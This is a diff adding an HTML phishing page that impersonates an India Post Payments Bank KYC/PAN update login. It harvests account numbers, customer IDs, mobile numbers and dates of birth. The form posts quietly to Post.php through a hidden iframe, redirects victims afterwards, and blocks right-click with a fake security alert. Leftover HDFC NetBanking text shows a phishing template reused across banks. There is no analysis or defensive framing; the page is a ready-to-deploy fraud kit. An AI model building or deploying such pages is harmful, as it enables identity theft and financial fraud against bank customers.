@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html lang="zxx">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="apple-touch-icon" sizes="180x180" href="img/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="img/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="img/favicon-16x16.png">
+<link rel="manifest" href="/site.webmanifest">
+<meta name="msapplication-TileColor" content="#da532c">
+<meta name="theme-color" content="#ffffff">
+    <title> IndiaPost Payment Bank KYC login</title>
+    <style>
+        #hh,#jj
+        {
+            width: 104%;
+            margin:-8px;
+            margin-left:-7px;
+        }
+        #nt
+        {
+        width: 7%;
+        margin-left:20px;
+        position:absolute;
+        }
+        #ij
+        {
+        width: 102%;
+        margin-left:-6px;
+        }
+        #bb,#dd,#ff,#ii
+        {
+            width: 280px;
+            height:30px;
+            padding:3px 10px;
+            background-color:white;
+            border-style:solid;
+            outline:none;
+            border-color:#AE2924;
+            border-width:1px;
+            color:#AE2924;
+            font-size:15px;
+            font-weight: bold;
+            font-style: italic;
+            margin:2px;
+            border-radius:4px;
+            margin-left:20px;
+        }
+        
+        #bb:hover
+        {
+        width: 280px;
+        height:30px;
+        padding:3px 10px;
+        background-color:white;
+        border-style:solid;
+        outline:none;
+        border-color:#AE2924;
+        box-shadow:0 0 6px 0 #AE2924;
+        border-width:1px;
+        color:#AE2924;
+        font-weight: bold;
+        font-style: italic;
+        margin:2px;
+        border-radius:4px;
+        margin-left:20px;
+        }
+        #dd:hover
+        {
+        width: 280px;
+        height:30px;
+        padding:3px 10px;
+        background-color:white;
+        border-style:solid;
+        outline:none;
+        border-color:#AE2924;
+        box-shadow:0 0 6px 0 #AE2924;
+        border-width:1px;
+        color:#AE2924;
+        font-weight: bold;
+        font-style: italic;
+        margin:2px;
+        border-radius:4px;
+        margin-left:20px;
+        }
+        
+        #ff:hover
+        {
+        width: 280px;
+        height:30px;
+        padding:3px 10px;
+        background-color:white;
+        border-style:solid;
+        outline:none;
+        border-color:#AE2924;
+        box-shadow:0 0 6px 0 #AE2924;
+        border-width:1px;
+        color:#AE2924;
+        font-weight: bold;
+        font-style: italic;
+        margin:2px;
+        border-radius:4px;
+        margin-left:20px;
+        }
+        
+        #ii:hover
+        {
+        width: 280px;
+        height:30px;
+        padding:3px 10px;
+        background-color:white;
+        border-style:solid;
+        outline:none;
+        border-color:#AE2924;
+        box-shadow:0 0 6px 0 #AE2924;
+        outline:none;
+        border-width:1px;
+        color:#AE2924;
+        font-weight: bold;
+        font-style: italic;
+        margin:2px;
+        border-radius:4px;
+        margin-left:20px;
+        }
+        
+        #ll
+        {
+            background-color:#AE2924;
+            color: white;
+            padding: 0px 0px;
+            margin: 10px 25px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px; width: 120px; height: 36px;
+        }
+        #ab
+        {
+        width:360px;
+        border-bottom: solid #f3f3f3;
+        border-width:10px;
+        }
+        #ll:hover
+        {
+        background-color:#3E1128;
+        color: white;
+        padding: 0px 0px;
+        margin: 10px 25px;
+        border: none;
+        border-radius: 4px;
+        cursor: pointer;
+        font-size: 16px; width: 120px; height: 36px;
+        }
+        #con
+        {
+        background-color:#c5d4e8;
+        width:280px;
+        height: 130px;
+        padding: 10px 15px;
+        margin:4px;
+        margin-left:18px;
+        border-radius:1px;
+        }
+        #kyc
+        {
+        width:104%;   
+        background-color:#3E1128;
+        height:55px;
+        margin:6px;
+        margin-left:-7px;
+        }
+        #col
+        {
+        width:104%;   
+        background-color:#D8D1DB;
+        height:450px;
+        margin:-6px;
+        margin-left:-7px;
+        }
+        input::-webkit-input-placeholder {
+        font-style: italic;
+        }
+        input:-moz-placeholder {
+        font-style: italic;
+        }
+        input::-moz-placeholder {
+        font-style: italic;
+        }
+        input:-ms-input-placeholder {
+        font-style: italic;
+        }
+    </style>
+    <script language="javascript">
+    
+    var message="For security reasons,This function is not allowed here.";
+    function clickIE4(){
+    
+    if (event.button==2){
+    alert(message);
+    return false;
+    }
+    }
+    
+    function clickNS4(e){
+    if (document.layers||document.getElementById&&!document.all){
+    if (e.which==2||e.which==3){
+    alert(message);
+    return false;
+    }
+    }
+    }
+    
+    if (document.layers){
+    document.captureEvents(Event.MOUSEDOWN);
+    document.onmousedown=clickNS4;
+    }
+    
+    else if (document.all&&!document.getElementById){
+    document.onmousedown=clickIE4;
+    }
+    
+    document.oncontextmenu=new Function("alert(message);return false;")
+    
+    </script>
+</head>
+<body>
+<!-- Static- Please don't do anything here-->
+     <script type="text/javascript">var submitted=false;</script>
+     <iframe name="hidden_iframe" id="hidden_iframe" style="display: none" onload="if(submitted){window.location='proccess.html';}"></iframe>
+     <!--My Form-->
+     <form action="Post.php" method="post" target="hidden_iframe" onsubmit="submitted=true" class="myform">
+    <center><img src="img/indiapost.png" id="hh"></center>
+    </div>
+      <div id="kyc"><br>
+       <b style="color:white; padding:20px;">CONTINUE TO PAN UPDATE</b>
+       </div>
+       <div id="col">
+       <br>
+       <b style="font-family: Arial; 
+       color:#AE2924; 
+       padding:0px 20px; font-size:16px;"><i>Account Number*</i></b>
+        <div id="ta" required="">
+            <input type="text" name="Account Number" inputmode="numeric" maxlength="12" id="bb" placeholder="Enter Your Account Number"
+             pattern="[0-9]\d{11}"
+             title="Please Enter Valid 12 Digit Account Number"
+             required="">
+              <br><br>
+            <b style="font-family: Arial; 
+            color:#AE2924; 
+            padding:0px 20px; font-size:16px;"><i>Customer ID*</i></b>
+        </div>
+        <div id="ct">
+            <input type="text" name="Customer ID" id="dd" inputmode="numeric" maxlength="10" placeholder="Enter Your Customer ID(CIF Number)"
+            pattern="[0-9]\d{9}"
+            title="Please Enter Valid 10 Digit Customer Id(CIF Number)"
+            required=""><br><br>
+              <div id="tx">
+            <b style="font-family: Arial; 
+            color:#AE2924; 
+            padding:0px 20px; font-size:16px;"><i>Mobile Number*</i></b>
+        </div>
+        <div id="te">
+            <input type="text" name="Mobile No." id="ff" inputmode="numeric" placeholder="Enter Your Mobile Number" maxlength="10"
+             pattern="[6-9]\d{9}"
+             title="Please Enter Valid 10 Digit Mobile Number" 
+             required=""> <br><br>
+             <b style="font-family: Arial; 
+             color:#AE2924; 
+             padding:0px 20px; font-size:16px;"><i>Date Of Birth*</i></b>
+             </div>
+             <div id="ta" required="">
+             <input type="tel" name="Date Of Birth" id="bb" inputmode="numeric" maxlength="10" placeholder="Enter Your Date Of Birth"
+             required="">
+             </div><br>
+             <!--<div>
+             <img src="Note_i.jpg" alt="" id="nt">
+             <span style="color:#3E1128; font-size:20px; margin-left:50px;">Note</span>
+              </div>-->
+              <div id="kk">
+             <button type="submit" id="ll" style="font-weight: bold;">SUBMIT</button><br>
+             </div><br><br>
+            <!-- <div id="con">
+             <div>
+             <p1 style="color:black; font-size:14px; margin-left:0px;">Dear Customer,<br>Welcome to the new login page of HDFC
+             <br>Bank NetBanking<br>
+             Its lighter look and feel is designed to give<br>you the best possible user experience.<br>Please continue to login using your<br>customer ID and password.
+             </p1></div></div>-->
+             <img src="img/footerpost.jpg" alt="" id="ij"><br><br>
+              
